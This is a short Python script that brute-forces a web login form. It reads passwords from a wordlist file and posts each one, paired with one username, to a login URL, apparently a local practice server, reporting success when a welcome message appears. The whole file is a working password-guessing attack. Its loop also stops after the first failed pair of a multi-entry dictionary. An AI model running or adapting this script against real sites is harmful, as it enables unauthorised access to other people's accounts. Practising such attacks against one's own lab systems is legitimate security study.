import requests


def bruteForceLogin(hostname, users) -> bool:
    """
        Attempts to log in to a specified hostname using a dictionary of user credentials.

        Parameters:
        - hostname (str): The URL or IP address of the target login page.
        - users (dict): A dictionary where keys are usernames and values are passwords.

        Returns:
        - bool: True if login is successful for any user credential, False otherwise.

        Description:
        Iterates through the provided user credentials, attempting to log in for each pair.
        Checks for a successful login by verifying the response status code and the presence
        of a welcome message in the response text. Stops and returns True upon the first successful login attempt.
    """
    for username, password in users.items():
        response = requests.post(
            hostname, data={"username": username, "password": password}
        )
        # print(response.text)
        if (
            response.status_code == 200
            and f"Welcome back, {username}!" in response.text
        ):
            return True
        else:
            return False


if __name__ == "__main__":
    hostname = "http://127.0.0.1:5000/pythonlogin"
    with open("worst_passwords.txt", "r") as f:
        lines = f.readlines()
        for line in lines:
            password = line.strip()
            users = {
                "username1": password,
            }
            is_success = bruteForceLogin(hostname, users)
            if is_success:
                print(f"username1 {password} SUCCESS")
            else:
                print("FAILED")
